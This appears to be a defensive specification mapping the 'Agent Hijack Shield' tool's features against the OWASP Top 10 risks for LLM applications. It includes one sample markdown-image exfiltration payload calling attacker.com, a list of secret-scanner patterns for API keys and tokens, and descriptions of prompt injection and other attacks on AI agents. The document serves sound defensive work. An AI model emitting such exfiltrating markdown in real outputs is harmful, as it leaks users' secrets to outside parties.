# OWASP Top 10 for LLM Applications: Defense Mapping

This document provides a comprehensive compliance and defense matrix mapping **Agent Hijack Shield (PS-023)** capabilities directly against the **OWASP Top 10 for Large Language Model (LLM) Applications**.

---

## Summary Mapping Table

| OWASP LLM Risk | Threat Description | Agent Hijack Shield Defense Mechanisms | Status |
| :--- | :--- | :--- | :--- |
| **LLM01: Prompt Injection** | Direct jailbreaks, indirect prompt injection via untrusted web pages, documents, emails, and RAG chunks. | Multi-stage normalizer (Unicode/homoglyph/base64), heuristic & regex detection engine, random cryptographic boundary wrapping, provenance taint tracking, intent-tool alignment check. | **Enforced** |
| **LLM02: Sensitive Information Disclosure** | Leaking private credentials, API keys, passwords, PII, internal system prompts, or credit card numbers. | Inbound & outbound secret scanner (AWS, GCP, GitHub, Slack, OpenAI, Anthropic, Private Keys, JWTs), Luhn credit card check, outbound DLP, PII redaction, HMAC audit masking. | **Enforced** |
| **LLM03: Supply Chain Vulnerabilities** | Compromised dependencies, poisoned evaluation sets, tampered agent policies, vulnerable third-party tools. | SHA-256 dataset integrity checksums (`eval/CHECKSUMS.sha256`), tamper-evident agent policy versioning and audit history, pinned Python dependencies, fail-closed loader. | **Enforced** |
| **LLM04: Data and Model Poisoning** | Memory poisoning, persistent conversational context drift, gradual multi-turn manipulation (crescendo attacks). | Turn-by-turn session risk accumulator, exponential decay drift tracker, sliding window crescendo detection, automated circuit breaker quarantine. | **Enforced** |
| **LLM05: Improper Output Handling** | Malicious markdown injection (`![exfil](https://attacker.com/leak?data=...)`), XSS via unescaped rendering, blind tool invocation. | Outbound filter neutralizing auto-exfiltrating markdown links/images, frontend dashboard text-content isolation, execution capability token requirement. | **Enforced** |
| **LLM06: Excessive Agency** | Autonomous agents executing sensitive actions (emails, financial transfers, code execution) without authorization. | Declarative least-privilege YAML agent policies, default-deny tool dispatcher, mandatory Human-in-the-Loop approvals for side effects, single-use HMAC capability tokens. | **Enforced** |
| **LLM07: System Prompt Leakage** | Extraction of confidential system instructions, internal guardrails, proprietary guidelines, or secret keys. | Dynamic canary token seeding in system prompt, outbound canary leak inspection with immediate critical circuit breaker quarantine of agent and session. | **Enforced** |
| **LLM08: Vector and Embedding Weaknesses** | Poisoned RAG embeddings, indirect injection via retrieval pipelines, unvalidated semantic search chunks. | Zero-trust external document coercion (`trust_level=EXTERNAL`), unconditional session taint on document ingestion, taint-escalated approval requirements for all side-effect tools. | **Enforced** |
| **LLM09: Misinformation & Lack of Verification** | Agent hallucinations, untrusted tool output consumption without verification, audit repudiation. | Cryptographic hash-chained audit log linking all inputs, tool decisions, and outputs; verification via `/v1/audit/verify`; provenance metadata tracking. | **Enforced** |
| **LLM10: Unbounded Consumption** | Resource exhaustion, Denial of Service (DoS/ReDoS), runaway tool execution loops, excessive financial spend. | Sliding-window client rate limiter (leaky bucket), strict 1MB body size limit, detector regex timeout protection (fail-closed), per-agent transaction financial budgets. | **Enforced** |

---

## Detailed Defense Specifications

### LLM01: Prompt Injection (Direct & Indirect)
- **Normalizer**: De-obfuscates text before pattern matching:
  - Base64, Hex, ROT13, and URL decoding with depth and byte limits.
  - Unicode homoglyph normalization (NFKC + confusable mapping across Cyrillic, Greek, Math symbols).
  - Invisible character stripping (zero-width spaces, directional overrides, soft hyphens).
  - Delimiter escape neutralizing (`[NEUTRALIZED_BOUNDARY_ATTEMPT]`).
- **Detection Engine**:
  - Over 45 compiled regex patterns categorized into direct overrides (`R_OVR_*`), role reassignment (`R_JLB_*`), system prompt extraction (`R_PRM_*`), fake role tags (`R_TAG_*`), concealment (`R_CNC_*`), and tool poisoning (`R_TLS_*`).
  - Quoted educational discount: Reduces false positives on security inquiries unless untrusted external content or unquoted attack phrases are detected.
- **Random Delimiters**: External content wrapped with random 128-bit hex tokens:
  ```
  <<<EXTERNAL_UNTRUSTED_CONTENT_7f3b89a1_source:https://external.com>>>
  [Content]
  <<<END_EXTERNAL_UNTRUSTED_CONTENT_7f3b89a1>>>
  ```
- **Provenance & Taint**: Any ingested external content permanently marks session `is_tainted=True`.

---

### LLM02: Sensitive Information Disclosure
- **High-Entropy & Pattern Secret Scanner**:
  - AWS Access Keys (`AKIA...`), Secret Access Keys.
  - OpenAI Keys (`sk-proj-...`, `sk-...`), Anthropic Keys (`sk-ant-...`).
  - Google Cloud / Firebase API Keys (`AIzaSy...`).
  - Slack Tokens (`xoxb-...`, `xoxp-...`).
  - GitHub Personal Access Tokens (`ghp_...`, `github_pat_...`).
  - Private Keys (`-----BEGIN RSA PRIVATE KEY-----`).
  - JSON Web Tokens (`eyJhbGciOi...`).
  - Credit Cards verified via Luhn checksum.
- **Enforcement**: Plaintext secrets in tool arguments trigger immediate hard `DENY` with reason `SENSITIVE_DATA_IN_ARGUMENTS`. Outbound filter redacts sensitive data prior to transmission.

---

### LLM05: Improper Output Handling
- **Markdown Auto-Exfiltration Guard**:
  - Detects and strips markdown image tags `![alt](url)` attempting to append sensitive data as query parameters.
  - Strips dangerous URI schemes (`javascript:`, `data:`, `vbscript:`).
- **Dashboard Defense**:
  - All web dashboard interfaces strictly bind untrusted text to DOM elements using `textContent` rather than `innerHTML` to prevent Cross-Site Scripting (XSS).

---

### LLM06: Excessive Agency
- **Least-Privilege Policy Enforcement**:
  - Every agent operates under a YAML policy defining `allowed_tools`, `require_approval_tools`, and `denied_tools`.
  - Tool calls not explicitly authorized evaluate to `DENY` (`TOOL_NOT_IN_ALLOWLIST`).
- **Domain-Separated Capability Tokens**:
  - Tools reject direct execution without a cryptographically signed HMAC token.
  - Tokens are bound to `(agent_id, tool_name, args_hash, request_id)` with a 5-minute expiry.
  - Single-use consumption guarantees anti-replay protection.
  - Capability tokens are **never** leaked to untrusted clients in `/v1/chat` responses.
- **Human-in-the-Loop Approvals**:
  - High-risk operations (`send_email`, `write_file`, `transfer_funds`) generate approval requests in SQLite.
  - Approvers review requests via `/v1/approvals` and issue approved capability tokens.

---

### LLM07: System Prompt Leakage
- **Canary Injection**: A unique cryptographic canary token (`ahs_canary_<uuid>`) is prepended to agent prompt instructions.
- **Outbound Inspection**: The outbound filter validates all model outputs for the presence of the canary string.
- **Fail-Closed Quarantine**: If a canary leak is detected:
  - The model response is blocked and redacted.
  - The circuit breaker immediately places the offending session and agent into **quarantine**.
  - A high-severity audit record is appended to the tamper-evident chain.

---

### LLM10: Unbounded Consumption & DoS
- **Sliding-Window Rate Limiting**: Enforces strict requests-per-minute quotas per client IP/key using an in-memory leaky bucket with automatic TTL eviction.
- **Payload Size Limits**: Middleware strictly terminates requests exceeding 1 MB (`413 Payload Too Large`), preventing memory-bomb and buffer exhaustion attacks.
- **Regex Timeout Guard**: Inbound detectors enforce strict per-regex timeout execution bounds (failing closed to `BLOCK` upon timeout) to thwart ReDoS attacks.
